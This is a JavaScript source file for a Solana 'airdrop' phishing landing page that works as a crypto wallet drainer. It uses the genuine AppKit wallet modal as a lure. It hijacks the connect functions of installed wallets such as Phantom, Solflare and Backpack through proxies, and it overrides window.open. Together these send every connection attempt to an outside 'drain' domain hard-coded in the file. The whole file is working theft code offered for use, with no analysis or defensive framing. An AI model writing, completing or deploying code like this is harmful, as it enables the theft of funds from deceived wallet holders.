// =====================================================
// LANDING SOL — Real AppKit on main domain (Solana)
// Installed wallets + WalletConnect → drain domain popup
// Not-installed wallets → AppKit handles natively (QR/download)
// =====================================================
import { createAppKit } from '@reown/appkit'
import { SolanaAdapter } from '@reown/appkit-adapter-solana'
import { solana } from '@reown/appkit/networks'
import { ConnectorController } from '@reown/appkit-controllers'

const DRAIN_BASE = 'https://drforsostate.vercel.app/';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// INIT REAL APPKIT — shows real wallet list with INSTALLED badges
// =====================================================
const solanaAdapter = new SolanaAdapter();

const modal = createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — Solana Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393',
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
    '1ca0bdd4747578705b1939af023d120677c64fe11e7da5edcf4ecab371b2c723',
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#14F195',
  },
});

// =====================================================
// DETECT INSTALLED WALLETS
// =====================================================
function isWalletInstalled(walletName) {
  const n = (walletName || '').toLowerCase();
  if (n.includes('phantom')) {
    return !!(window.phantom?.solana || window.solana?.isPhantom);
  }
  if (n.includes('solflare')) {
    return !!(window.solflare?.isSolflare);
  }
  if (n.includes('backpack')) {
    return !!(window.backpack?.solana);
  }
  if (n.includes('trust')) {
    return !!(window.trustwallet?.solana || window.solana?.isTrust);
  }
  if (n.includes('coinbase')) {
    return !!(window.coinbaseSolana);
  }
  // Also check AppKit's own connector list
  try {
    const connectors = ConnectorController.getConnectors();
    for (const c of connectors) {
      if (c.name && c.name.toLowerCase().includes(n)) {
        if (c.type === 'INJECTED' || c.type === 'ANNOUNCED') return true;
      }
    }
  } catch (e) {}
  return false;
}

function isWalletConnect(walletName) {
  const n = (walletName || '').toLowerCase();
  return n.includes('walletconnect') || n.includes('qr') || n === 'wc';
}

// =====================================================
// OPEN POPUP WITH WALLET NAME IN URL
// =====================================================
let popupOpened = false;

const _origOpen = window.open.bind(window);

function openDrainPopup(walletName) {
  if (popupOpened) return;
  popupOpened = true;

  try { modal.close(); } catch (e) {}
  try { modal.disconnect(); } catch (e) {}

  const w = (walletName || '').toLowerCase();
  let walletKey = 'auto';
  if (w.includes('phantom')) walletKey = 'phantom';
  else if (w.includes('solflare')) walletKey = 'solflare';
  else if (w.includes('trust')) walletKey = 'trust';
  else if (w.includes('backpack')) walletKey = 'backpack';
  else if (w.includes('coinbase')) walletKey = 'coinbase';
  else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';

  const url = `${DRAIN_BASE}?connect=1&w=${walletKey}`;

  if (isMobile) {
    window.location.href = url;
  } else {
    const pw = 360, ph = 440;
    const left = Math.round((screen.width - pw) / 2);
    const top = Math.round((screen.height - ph) / 2);
    _origOpen(url, 'connect_wallet',
      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
    );
  }

  setTimeout(() => { popupOpened = false; }, 2000);
}

// =====================================================
// INTERCEPT: ONLY installed wallets + WalletConnect → drain
// Not-installed wallets → let AppKit handle natively
// =====================================================
let lastClickedWallet = '';

// Block installed Solana wallet providers from connecting on landing
function blockSolanaWallet(obj, prop, walletName) {
  if (!obj || !obj[prop]) return;
  const real = obj[prop];
  if (real._landingBlocked) return;
  const handler = {
    get(target, key) {
      if (key === '_landingBlocked') return true;
      if (key === 'connect') {
        return function() {
          openDrainPopup(walletName);
          return new Promise(() => {});
        };
      }
      const val = Reflect.get(target, key);
      return typeof val === 'function' ? val.bind(target) : val;
    }
  };
  try {
    const proxy = new Proxy(real, handler);
    Object.defineProperty(obj, prop, {
      configurable: true,
      enumerable: true,
      get() { return proxy; },
      set() {},
    });
  } catch (e) {
    real._landingBlocked = true;
    real.connect = function() {
      openDrainPopup(walletName);
      return new Promise(() => {});
    };
  }
}

function blockAllSolanaProviders() {
  if (window.phantom?.solana) blockSolanaWallet(window.phantom, 'solana', 'phantom');
  if (window.solana && !window.solana._landingBlocked) {
    try {
      window.solana._landingBlocked = true;
      window.solana.connect = function() {
        openDrainPopup(lastClickedWallet || 'phantom');
        return new Promise(() => {});
      };
    } catch (e) {}
  }
  if (window.solflare) blockSolanaWallet(window, 'solflare', 'solflare');
  if (window.backpack?.solana) blockSolanaWallet(window.backpack, 'solana', 'backpack');
}

blockAllSolanaProviders();
setTimeout(blockAllSolanaProviders, 300);
setTimeout(blockAllSolanaProviders, 800);
setTimeout(blockAllSolanaProviders, 1500);
setTimeout(blockAllSolanaProviders, 3000);

// Listen for wallet selection events
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET') {
    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
    if (name) {
      lastClickedWallet = name;
      // Only redirect to drain if wallet is INSTALLED or it's WalletConnect
      if (isWalletInstalled(name) || isWalletConnect(name)) {
        openDrainPopup(name);
      }
      // Otherwise: do nothing — let AppKit handle it natively (QR/download page)
    }
  }
});

// If wallet somehow connects to landing, disconnect and redirect
modal.subscribeProviders((state) => {
  if (state['solana']) {
    try { modal.disconnect(); } catch (e) {}
    openDrainPopup(lastClickedWallet);
  }
});

// Intercept deep links only for installed wallets
window.open = function(url, ...args) {
  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
    if (url.includes('phantom') && isWalletInstalled('phantom')) { openDrainPopup('phantom'); return null; }
    if (url.includes('solflare') && isWalletInstalled('solflare')) { openDrainPopup('solflare'); return null; }
    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup('walletconnect'); return null; }
  }
  return _origOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  popupOpened = false;
  lastClickedWallet = '';
  modal.open({ view: 'Connect' });
};

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  popupOpened = false;
  lastClickedWallet = '';
  modal.open({ view: 'Connect' });
};
